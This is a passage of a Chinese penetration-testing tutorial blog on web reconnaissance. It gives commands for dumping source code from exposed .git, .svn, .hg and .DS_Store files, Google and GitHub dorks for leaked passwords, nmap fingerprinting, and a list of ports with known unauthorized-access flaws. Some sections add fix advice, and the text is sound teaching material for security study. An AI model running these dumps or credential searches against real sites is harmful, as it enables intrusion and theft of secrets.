class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一般包括流量统计，文件编辑器，模板引擎</span><br></pre></td></tr></table></figure><p>CMS 程序：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">robots.txt文件识别：（相关厂商下的cms（内容管理系统）程序文件包含说明当前cms名称及版本的特征码）</span><br><span class="line">Disallow: /plus/feedback_js.php</span><br><span class="line">Disallow: /plus/mytag_js.php</span><br><span class="line">Disallow: /plus/rss.php</span><br><span class="line">Disallow: /plus/search.php</span><br><span class="line">Disallow: /plus/recommend.php</span><br><span class="line">Disallow: /plus/stow.php</span><br><span class="line">Disallow: /plus/count.php</span><br><span class="line">看到这个基本可以判断为dedecms</span><br><span class="line">    </span><br><span class="line">网站favicon图标</span><br></pre></td></tr></table></figure><p>数据库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常规判断：asp--&gt;sql server , php--&gt;mysql , jsp--&gt;oracle</span><br><span class="line"></span><br><span class="line">网站错误信息</span><br><span class="line"></span><br><span class="line">端口服务：1433--&gt;sql server , 3306--&gt;mysql , 1521--&gt;oracle</span><br></pre></td></tr></table></figure><h2 id="源码泄露安全"><a class="markdownIt-Anchor" href="#源码泄露安全">#</a> 源码泄露安全</h2><p>Web 源码泄露的漏洞：</p><ul><li><p>git 源码泄露</p></li><li><p>svn 源码泄露</p></li><li><p>hg 源码泄漏</p></li><li><p>网站备份压缩文件</p></li><li><p>WEB-INF/web.xml 泄露</p></li><li><p>DS_Store 文件泄露</p></li><li><p>SWP 文件泄露</p></li><li><p>CVS 泄露</p></li><li><p>Bzr 泄露</p></li><li><p>GitHub 源码泄漏</p></li></ul><h3 id="git-源码泄露"><a class="markdownIt-Anchor" href="#git-源码泄露">#</a> git 源码泄露</h3><p>Git 是一个开源的分布式版本控制系统，在执行 git init 初始化目录的时候，会在当前目录下自动创建一个.git 目录，用来记录代码的变更记录等。发布代码的时候，如果没有把.git 这个目录删除，就直接发布到了服务器上，攻击者就可以通过它来恢复源代码；</p><h4 id="githack"><a class="markdownIt-Anchor" href="#githack">#</a> GitHack</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL0dpdEhhY2s=">https://github.com/lijiejie/GitHack</span></p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http://www.openssl.org/.git/</span><br></pre></td></tr></table></figure><p>修复建议：删除.git 目录或者修改中间件配置进行对.git 隐藏文件夹的访问；</p><h3 id="svn-源码泄露"><a class="markdownIt-Anchor" href="#svn-源码泄露">#</a> SVN 源码泄露</h3><p>SVN 是一个开放源代码的版本控制系统。在使用 SVN 管理本地代码过程中，会自动生成一个名为.svn 的隐藏文件夹，其中包含重要的源代码信息。网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到 WEB 服务器上，这就使.svn 隐藏文件夹被暴露于外网环境，可以利用.svn/entries 文件，获取到服务器源码；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FkbWludG9ueS9zdm5FeHBsb2l0">https://github.com/admintony/svnExploit</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/admintony/svnExploit.git</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">python SvnExploit.py -h</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">检测SVN源代码泄露：</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn</span><br><span class="line"></span><br><span class="line">下载源代码：</span><br><span class="line">python SvnExploit.py -u http://192.168.27.128/.svn --dump</span><br></pre></td></tr></table></figure><p>修复建议：删除 web 目录中所有.svn 隐藏文件夹，开发人员在使用 SVN 时，严格使用导出功能，禁止直接复制代码</p><h3 id="hg源码泄漏"><a class="markdownIt-Anchor" href="#hg源码泄漏">#</a> hg 源码泄漏</h3><p>Mercurial 是一种轻量级分布式版本控制系统，使用 hg init 的时候会生成.hg；</p><h4 id="dvcs-ripper"><a class="markdownIt-Anchor" href="#dvcs-ripper">#</a> dvcs-ripper</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2tvc3QvZHZjcy1yaXBwZXI=">https://github.com/kost/dvcs-ripper</span></p><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br><span class="line"></span><br><span class="line">//忽略 SSL 认证验证（使用 -s）:</span><br><span class="line">rip-hg.pl -s -v -u http://www.example.com/.hg/</span><br></pre></td></tr></table></figure><h3 id="cvs泄露"><a class="markdownIt-Anchor" href="#cvs泄露">#</a> CVS 泄露</h3><p>CVS 是一个 C/S 系统，多个开发人员通过一个中心版本控制系统来记录文件版本，从而达到保证文件同步的目的。主要是针对 CVS/Root 以及 CVS/Entries 目录，直接就可以看到泄露的信息；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root 返回根信息</span><br><span class="line">http://url/CVS/Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><p>工具同上：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使用：</span><br><span class="line">rip-cvs.pl -v -u http://www.example.com/CVS/</span><br></pre></td></tr></table></figure><h3 id="bazaarbzr泄露"><a class="markdownIt-Anchor" href="#bazaarbzr泄露">#</a> Bazaar/bzr 泄露</h3><p>bzr 也是个版本控制工具，虽然不是很热门，但它也是多平台支持，并且有不错的图形界面；</p><p>工具同上：dvcs-ripper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure><h3 id="网站备份压缩文件"><a class="markdownIt-Anchor" href="#网站备份压缩文件">#</a> 网站备份压缩文件</h3><p>管理员将网站源代码备份在 Web 目录下，攻击者通过猜解文件路径，下载备份文件，导致源代码泄露；</p><p>常见的备份文件后缀：</p><ul><li><p>.rar</p></li><li><p>.zip</p></li><li><p>.7z</p></li><li><p>.tar.gz</p></li><li><p>.bak</p></li><li><p>.txt</p></li><li><p>.old</p></li><li><p>.temp</p></li></ul><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Zvcnl1amlhbg==">https://github.com/foryujian</span></p><h3 id="web-infwebxml-泄露"><a class="markdownIt-Anchor" href="#web-infwebxml-泄露">#</a> WEB-INF/web.xml 泄露</h3><p>WEB-INF 是 Java 的 WEB 应用的安全目录，如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF 主要包含一下文件或目录：</span><br><span class="line"></span><br><span class="line">WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</span><br><span class="line">WEB-INF/database.properties : 数据库配置文件</span><br><span class="line">WEB-INF/classes/ : 一般用来存放Java类文件(.class)</span><br><span class="line">WEB-INF/lib/ : 用来存放打包好的库(.jar)</span><br><span class="line">WEB-INF/src/ : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure><p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码；</p><h3 id="ds_store-文件泄露"><a class="markdownIt-Anchor" href="#ds_store-文件泄露">#</a> DS_Store 文件泄露</h3><p>.DS_Store 是 Mac 下 Finder 用来保存如何展示 文件 / 文件夹 的数据文件，每个文件夹下对应一个。如果将.DS_Store 上传部署到服务器，可能造成文件目录结构泄漏，特别是备份文件、源代码文件；</p><h4 id="ds_store_exp"><a class="markdownIt-Anchor" href="#ds_store_exp">#</a> ds_store_exp</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL2RzX3N0b3JlX2V4cA==">https://github.com/lijiejie/ds_store_exp</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/lijiejie/ds_store_exp.git</span><br><span class="line">cd ds_store_exp</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><h3 id="swp-文件泄露"><a class="markdownIt-Anchor" href="#swp-文件泄露">#</a> SWP 文件泄露</h3><p>swp 即 swap 文件，在编辑文件时产生的临时文件，它是隐藏文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，文件名为 .filename.swp；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞利用：直接访问.swp文件，下载回来后删掉末尾的.swp，获得源码文件</span><br></pre></td></tr></table></figure><h3 id="github源码泄露"><a class="markdownIt-Anchor" href="#github源码泄露">#</a> github 源码泄露</h3><p>GitHub 是一个面向开源及私有软件项目的托管平台，很多人喜欢把自己的代码上传到平台托管。攻击者通过关键词进行搜索，可以找到关于目标站点的敏感信息，甚至可以下载网站源码；</p><p>类似的代码托管平台还有很多，人才是最大的漏洞；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/search?q=smtp+user+@qq.com&amp;type=code</span><br></pre></td></tr></table></figure><h4 id="dumpall"><a class="markdownIt-Anchor" href="#dumpall">#</a> dumpall</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzB4SEpLL2R1bXBhbGw=">https://github.com/0xHJK/dumpall</span></p><p>安装：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#手动下载使用</span><br><span class="line">git clone https://github.com/0xHJK/dumpall</span><br><span class="line"></span><br><span class="line">#查看版本</span><br><span class="line">python3 dumpall.py --version</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#下载文件（源代码） </span><br><span class="line">dumpall -u &lt; url &gt; [-o &lt; outdir &gt; ] #示例</span><br><span class="line">dumpall -u http://example.com/.git/</span><br><span class="line">dumpall -u http://example.com/.svn/</span><br><span class="line">dumpall -u http://example.com/.DS_Store</span><br><span class="line">dumpall -u http://example.com/</span><br><span class="line"></span><br><span class="line">选项：</span><br><span class="line">  --version 显示版本并退出。</span><br><span class="line">  -u, --url TEXT 指定目标URL，支持.git/.svn/.DS_Store，以及页面索引</span><br><span class="line">  -o, --outdir TEXT 指定保存目录，默认目录命名主机名</span><br><span class="line">  --help 显示此消息并退出。</span><br></pre></td></tr></table></figure><h1 id="搭建"><a class="markdownIt-Anchor" href="#搭建">#</a> 搭建</h1><h2 id="系统"><a class="markdownIt-Anchor" href="#系统">#</a> 系统</h2><h3 id="ttl值判断系统"><a class="markdownIt-Anchor" href="#ttl值判断系统">#</a> TTL 值判断系统</h3><p>TTL 值全称是 “生存时间（Time To Live)”，简单的说它表示 DNS 记录在 DNS 服务器上缓存时间；</p><p>TTL 是数据包生存周期，根据减少的数可以判断经过了多少中间设备；</p><p>默认情况下的值：</p><p>WINDOWS NT/2000   TTL：128</p><p>WINDOWS 95/98 TTL：32</p><p>UNIX TTL：255</p><p>LINUX TTL：64</p><p>WIN7 TTL：64</p><h3 id="大小写判断"><a class="markdownIt-Anchor" href="#大小写判断">#</a> 大小写判断</h3><p>Linux 对大小写敏感，windows 对大小写不敏感；</p><p>改变 URL 中的大小写进行判断；</p><h3 id="nmap-系统指纹识别"><a class="markdownIt-Anchor" href="#nmap-系统指纹识别">#</a> nmap 系统指纹识别</h3><p>原理：</p><p>通过 TCP/IP 数据包发到目标主机，由于每个操作系统类型对于处理 TCP/IP 数据包都不相同，所以可以通过之间的差别判定操作系统类型；</p><p>识别方法一 (-O 参数：用来识别操作系统的类型)：</p><ul><li>nmap -sS -Pn -O ip</li><li><ul><li>nmap 识别操作系统指纹必须使用端口，所以不允许添加 - sn 参数</li></ul></li></ul><p>识别方法二 (端口服务识别)：</p><ul><li>nmap -sS -sV ip</li><li>每个操作系统都有特定的服务和端口；</li><li>windows 桌面连接使用的 3389 端口，RDP 协议<ul><li>445 端口 windows 的 smb 协议开启端口</li></ul></li><li>linux 系统远程连接 22 端口，ssh 协议</li></ul><h2 id="中间件"><a class="markdownIt-Anchor" href="#中间件">#</a> 中间件</h2><p>常见的中间件：</p><ul><li><ul><li>Apache</li><li>Nginx</li></ul></li><li><ul><li>IIS</li><li>tomcat</li></ul></li><li><ul><li>jetty</li><li>webloigc</li></ul></li><li><ul><li>JBOSS</li><li>等</li></ul></li></ul><p>判断方法：</p><ul><li>http 返回消息中 server 字段</li><li>F12–&gt;Network 查看</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627460586277-cbe01766-5571-4219-b9c6-fe401b853732.png" alt="img"></p><ul><li>根据报错信息判断</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627461061856-a51cee66-0ef4-42d2-9d91-c7c98439be05.png" alt="img"></p><ul><li>根据默认页面判断</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627461223570-5f872b38-0072-4b5c-843b-8c8848fdeff1.png" alt="img"></p><ul><li><p>通过端口服务探测</p></li><li><ul><li>tomcat，jboss：8080</li><li>weblogin：7001</li></ul></li><li><ul><li>namp -sS -Pn -sV ip</li></ul></li><li><p>curl 命令查询头信息</p></li><li><ul><li>curl <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29t">https://www.baidu.com</span> -i</li><li>curl <span class="exturl" data-url="aHR0cDovL3d3dy5iYWlkdS5jb20=">http://www.baidu.com</span> -i &gt;C:/ip.txt</li></ul></li><li><ul><li><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628064199381-3983cd84-9889-4039-8c61-4407d1f0af0d.png" alt="img"></li></ul></li></ul><h2 id="数据库"><a class="markdownIt-Anchor" href="#数据库">#</a> 数据库</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描">#</a> 端口扫描</h3><p>直接扫描全端口；</p><h3 id="默认端口"><a class="markdownIt-Anchor" href="#默认端口">#</a> 默认端口</h3><p>常见数据库默认端口：</p><ul><li><ul><li>Oracle — 1521</li><li>MySQL — 3306</li></ul></li><li><ul><li>SQL Server — 1433</li><li>DB2 — 5000</li></ul></li><li><ul><li>PostgreSQL — 5432</li><li>MongoDB — 27017</li></ul></li><li><ul><li>Redis — 6379</li></ul></li></ul><h1 id="架构"><a class="markdownIt-Anchor" href="#架构">#</a> 架构</h1><h2 id="敏感文件搜索"><a class="markdownIt-Anchor" href="#敏感文件搜索">#</a> 敏感文件搜索</h2><h3 id="github搜索"><a class="markdownIt-Anchor" href="#github搜索">#</a> Github 搜索</h3><ul><li><p>in:name test                #仓库标题搜索含有关键字 test</p></li><li><p>in:descripton test       #仓库描述搜索含有关键字</p></li><li><p>in:readme test            #Readme 文件搜素含有关键字</p></li></ul><p>搜索某些系统的密码</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYXJjaD9xPXNtdHArNTguY29tK3Bhc3N3b3JkKzMzMDYmYW1wO3R5cGU9Q29kZQ==">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</span></li><li><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628062611495-a5b181db-8c23-4b2f-91f5-213e61ad6f86.png" alt="img"></li></ul></li></ul><p>github 关键词监控</p><ul><li><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29kZXJjdG8uY29tL2EvNDY2NDAuaHRtbA==">https://www.codercto.com/a/46640.html</span></li></ul></li></ul><h4 id="google搜索"><a class="markdownIt-Anchor" href="#google搜索">#</a> Google 搜索</h4><p>google 配合 github 搜索敏感信息</p><ul><li><p>site:Github.com sa password</p></li><li><p>site:Github.com root password</p></li><li><p>site:Github.com User ID=‘sa’;Password</p></li><li><p>site:Github.com inurl:sql</p></li></ul><h4 id="svn-信息收集"><a class="markdownIt-Anchor" href="#svn-信息收集">#</a> SVN 信息收集</h4><p>google 配合 github 搜索 SVN 敏感信息</p><ul><li><p>site:Github.com svn</p></li><li><p>site:Github.com svn username</p></li><li><p>site:Github.com svn password</p></li><li><p>site:Github.com svn username password</p></li></ul><h4 id="综合信息收集"><a class="markdownIt-Anchor" href="#综合信息收集">#</a> 综合信息收集</h4><ul><li><p>site:Github.com password</p></li><li><p>site:Github.com ftp ftppassword</p></li><li><p>site:Github.com 密码</p></li><li><p>site:Github.com 内部</p></li></ul><h4 id="扩展参考"><a class="markdownIt-Anchor" href="#扩展参考">#</a> 扩展参考</h4><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTkyL2FydGljbGUvZGV0YWlscy85OTY5MDc0Mg==">https://blog.csdn.net/qq_36119192/article/details/99690742</span></p></li><li><p><span class="exturl" data-url="aHR0cDovL3d3dy4zNjF3YXkuY29tL2dpdGh1Yi1oYWNrLzYyODQuaHRtbA==">http://www.361way.com/github-hack/6284.html</span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vY24vZ2l0aHViL3NlYXJjaGluZy1mb3ItaW5mb3JtYXRpb24tb24tZ2l0aHViL3NlYXJjaGluZy1vbi1naXRodWIvc2VhcmNoaW5nLWNvZGU=">https://docs.github.com/cn/github/searching-for-information-on-github/searching-on-github/searching-code</span></p></li><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlYXJjaD9xPXNtdHArYmlsaWJpbGkuY29tJmFtcDt0eXBlPWNvZGU=">https://github.com/search?q=smtp+bilibili.com&amp;type=code</span></p></li></ul><h3 id="google-hacking"><a class="markdownIt-Anchor" href="#google-hacking">#</a> Google hacking</h3><p>详情参考前面的黑白引擎使用：</p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvYzk5NzQ5ZjctMWMxZC00YWVlLWE0ZTMtYTVmMTllMTlmMmYxPyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFpb2g4JUVGJUJDJTg5">https://www.yuque.com/docs/share/c99749f7-1c1d-4aee-a4e3-a5f19e19f2f1?#（密码：ioh8）</span> 《黑白引擎使用》</p><h3 id="wooyun漏洞库"><a class="markdownIt-Anchor" href="#wooyun漏洞库">#</a> wooyun 漏洞库</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93b295dW4ud2Vic2l0ZS8=">https://wooyun.website/</span></li></ul><h3 id="网盘搜索"><a class="markdownIt-Anchor" href="#网盘搜索">#</a> 网盘搜索</h3><p>凌云搜索  <span class="exturl" data-url="aHR0cHM6Ly93d3cubGluZ2Zlbmd5dW4uY29tLw==">https://www.lingfengyun.com/</span></p><p>盘搜搜：<span class="exturl" data-url="aHR0cDovL3d3dy5wYW5zb3NvLmNvbS8=">http://www.pansoso.com/</span></p><p>盘搜：<span class="exturl" data-url="aHR0cDovL3d3dy5wYW5zb3UuY29tLw==">http://www.pansou.com/</span></p><h3 id="js敏感信息"><a class="markdownIt-Anchor" href="#js敏感信息">#</a> js 敏感信息</h3><p>网站的许多的 url 连接都写到 js 里面；</p><p>js 的 api 接口里面包含用户信息比如账号和密码；</p><h4 id="jsfinder"><a class="markdownIt-Anchor" href="#jsfinder">#</a> jsfinder</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20va24xZmVzL0pTRmluZGVy">https://gitee.com/kn1fes/JSFinder</span></p><h4 id="packer-fuzzer"><a class="markdownIt-Anchor" href="#packer-fuzzer">#</a> Packer-Fuzzer</h4><p>寻找网站交互接口授权 key；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20va2V5Ym94ZHpkL1BhY2tlci1GdXp6ZXI=">https://gitee.com/keyboxdzd/Packer-Fuzzer</span></p><p>安装使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs &amp;&amp; sudo apt-get install npm</span><br><span class="line"></span><br><span class="line">git clone https://gitee.com/keyboxdzd/Packer-Fuzzer.git</span><br><span class="line"></span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line">python3 PackerFuzzer.py -u https://www.liaoxuefeng.com </span><br><span class="line"></span><br><span class="line">在repoets文件内查看结果，一个docx格式，一个html格式</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628065367424-f688a610-7851-4437-b80a-544df9989d1e.png" alt="img"></p><h4 id="secretfinder"><a class="markdownIt-Anchor" href="#secretfinder">#</a> SecretFinder</h4><p>一款基于 Python 脚本的 JavaScript 敏感信息搜索工具；</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRlZS5jb20vbXVjbi9TZWNyZXRGaW5kZXI=">https://gitee.com/mucn/SecretFinder</span></p><h2 id="端口类站点"><a class="markdownIt-Anchor" href="#端口类站点">#</a> 端口类站点</h2><h3 id="默认端口-2"><a class="markdownIt-Anchor" href="#默认端口-2">#</a> 默认端口</h3><h4 id="web应用服务端口"><a class="markdownIt-Anchor" href="#web应用服务端口">#</a> web 应用服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">80/443/8080---&gt; 常见web端口</span><br><span class="line">7001/7002--&gt; Weblogic控制台</span><br><span class="line">8080--&gt; Jboss/Resin/Jetty/Jenkins</span><br><span class="line">9090--&gt; WebSphere控制台</span><br><span class="line">4848--&gt; GlassFish控制台</span><br><span class="line">1352--&gt; Lotus domino控制台</span><br><span class="line">10000--&gt; Webmin-Web控制面板</span><br></pre></td></tr></table></figure><h4 id="文件共享服务端口"><a class="markdownIt-Anchor" href="#文件共享服务端口">#</a> 文件共享服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">21--&gt; Ftp文件传输协议</span><br><span class="line">69--&gt; tftp文件传输协议</span><br><span class="line">2049--&gt; Nfs服务</span><br><span class="line">389--&gt; Ldap目录访问协议</span><br></pre></td></tr></table></figure><h4 id="远程连接服务端口"><a class="markdownIt-Anchor" href="#远程连接服务端口">#</a> 远程连接服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">22--&gt; SSH远程连接</span><br><span class="line">3389--&gt; rdp远程连接</span><br><span class="line">5900--&gt; VNC</span><br><span class="line">5632--&gt; Pyanywhere服务</span><br></pre></td></tr></table></figure><h4 id="邮件服务端口"><a class="markdownIt-Anchor" href="#邮件服务端口">#</a> 邮件服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">25--&gt; SMTP服务</span><br><span class="line">110--&gt; POP3协议</span><br><span class="line">143--&gt; IMAP协议</span><br></pre></td></tr></table></figure><h4 id="网络常见协议端口"><a class="markdownIt-Anchor" href="#网络常见协议端口">#</a> 网络常见协议端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">53--&gt; DNS域名系统</span><br><span class="line">67/68--&gt; DHCP服务</span><br><span class="line">161--&gt; SNMP协议</span><br></pre></td></tr></table></figure><h4 id="特殊服务端口"><a class="markdownIt-Anchor" href="#特殊服务端口">#</a> 特殊服务端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2181--&gt; Zookeeper服务--分布式应用程序协同服务</span><br><span class="line">8069--&gt; Zabbix服务--基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案</span><br><span class="line">9200/9300--&gt; Elasticsearch服务--分布式多用户能力的全文搜索引擎</span><br><span class="line">11211--&gt; Memcache服务--分布式的高速缓存系统</span><br><span class="line">873--&gt; Rsync服务--linux系统下的数据镜像备份工具</span><br><span class="line">3690--&gt; Svn服务--开放源代码的版本控制系统</span><br></pre></td></tr></table></figure><h4 id="特殊服务端口未授权命令执行漏洞"><a class="markdownIt-Anchor" href="#特殊服务端口未授权命令执行漏洞">#</a> 特殊服务端口（未授权 / 命令执行 / 漏洞）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure><h4 id="常见端口和攻击方法"><a class="markdownIt-Anchor" href="#常见端口和攻击方法">#</a> 常见端口和攻击方法</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628060318469-3ac3f808-c3ee-4031-b844-5e3bfbcdd46a.png" alt="img"></p><h3 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2">#</a> 端口扫描</h3><p>当确定了目标大概的 ip 段后，可以先对 ip 的开放端口进行探测，一些特定服务可能开起在默认端口上，探测开放端口有利于快速收集目标资产，找到目标网站的其他功能站点；</p><h4 id="msscan端口扫描"><a class="markdownIt-Anchor" href="#msscan端口扫描">#</a> msscan 端口扫描</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvYmVydGRhdmlkZ3JhaGFtL21hc3NjYW4=">https://github.com/robertdavidgraham/masscan</span></p><p>使用介绍：<span class="exturl" data-url="aHR0cDovL3d3dy5zZWF1bmcuY2MvMjAyMC8wMi8wNS9tYXNzY2FuLWJhc2Uv">http://www.seaung.cc/2020/02/05/masscan-base/</span></p><h4 id="御剑端口扫描工具"><a class="markdownIt-Anchor" href="#御剑端口扫描工具">#</a> 御剑端口扫描工具</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1628059967166-26f2e5e3-a406-4d73-83dc-463bcbc1fc85.png" alt="img"></p><h4 id="nmap扫描端口和探测端口信息"><a class="markdownIt-Anchor" href="#nmap扫描端口和探测端口信息">#</a> Nmap 扫描端口和探测端口信息</h4><p>详细使用方法：<span class="exturl" 